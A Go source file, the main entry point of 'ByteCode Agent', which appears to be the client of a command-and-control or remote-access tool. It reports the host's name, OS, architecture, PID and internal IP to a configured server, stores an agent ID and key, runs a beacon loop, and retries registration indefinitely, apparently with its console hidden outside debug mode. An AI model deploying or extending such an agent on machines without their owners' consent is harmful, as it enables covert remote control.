package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"bytecode-agent/internal/beacon"
	"bytecode-agent/internal/comms"
	"bytecode-agent/internal/config"
	"bytecode-agent/internal/identity"
	"unsafe"
)

func ShowMessage(title, text string) {
	if runtime.GOOS != "windows" {
		return
	}
	user32 := syscall.NewLazyDLL("user32.dll")
	messageBox := user32.NewProc("MessageBoxW")
	messageBox.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		0)
}

func main() {
	// Banner
	fmt.Println("")
	fmt.Println("  ╔══════════════════════════════════════╗")
	fmt.Println("  ║     ByteCode Agent v1.0.0            ║")
	fmt.Println("  ╚══════════════════════════════════════╝")
	fmt.Println("")

	// Load configuration
	cfg := config.Load()

	if cfg.IsDebug {
		fmt.Println("  [DEBUG MODE ENABLED]")
		fmt.Println("  Console window is visible and verbose logging is active.")
		fmt.Println("")
		go ShowMessage("ByteCode Agent", "Agent started in Testing Mode.\n\nServer: "+cfg.ServerURL)
	}

	log.Printf("[INIT] Server: %s\n", cfg.ServerURL)
	if cfg.IsDebug {
		log.Printf("[DEBUG] Identity file path: %s\n", cfg.IdentityFile)
	}

	// Create HTTP client
	client := comms.NewClient(cfg.ServerURL)

	for {
		// Try to load existing identity
		existingID, err := identity.Load(cfg.IdentityFile)
		if err == nil && existingID.AgentID != "" {
			// Resume existing identity
			log.Printf("[INIT] Resuming identity: %s\n", existingID)
			client.SetAPIKey(existingID.APIKey)
		} else {
			// Register as new agent (Retry until successful)
			log.Println("[INIT] No existing identity found or identity invalid, attempting registration...")

			sysInfo := identity.GetSystemInfo()
			regReq := &comms.RegisterRequest{
				Hostname:   sysInfo.Hostname,
				OS:         sysInfo.OS,
				Arch:       sysInfo.Arch,
				PID:        sysInfo.PID,
				InternalIP: sysInfo.InternalIP,
			}

			var regResp *comms.RegisterResponse
			for {
				regResp, err = client.Register(regReq)
				if err == nil {
					break
				}
				log.Printf("[ERROR] Registration failed: %v. Retrying in 10s...\n", err)
				time.Sleep(10 * time.Second)
			}

			// Save identity to disk
			newID := &identity.Identity{
				AgentID:  regResp.AgentID,
				APIKey:   regResp.APIKey,
				Hostname: sysInfo.Hostname,
				OS:       sysInfo.OS,
				Arch:     sysInfo.Arch,
			}

			if err := identity.Save(cfg.IdentityFile, newID); err != nil {
				log.Printf("[WARN] Failed to save identity: %v\n", err)
			}

			client.SetAPIKey(regResp.APIKey)
			log.Printf("[INIT] Registered successfully: %s\n", newID)
		}

		// Start the beacon loop
		err = beacon.Loop(client, cfg)
		if err != nil && strings.Contains(err.Error(), "403") {
			log.Printf("[WARN] Identity rejected by server (403). Clearing identity and re-registering...\n")
			os.Remove(cfg.IdentityFile)
			// Small delay before retry
			time.Sleep(2 * time.Second)
			continue
		}

		// If loop exited for other reasons, wait and retry
		log.Printf("[ERROR] Beacon loop exited: %v. Retrying in 30s...\n", err)
		time.Sleep(30 * time.Second)
	}
}
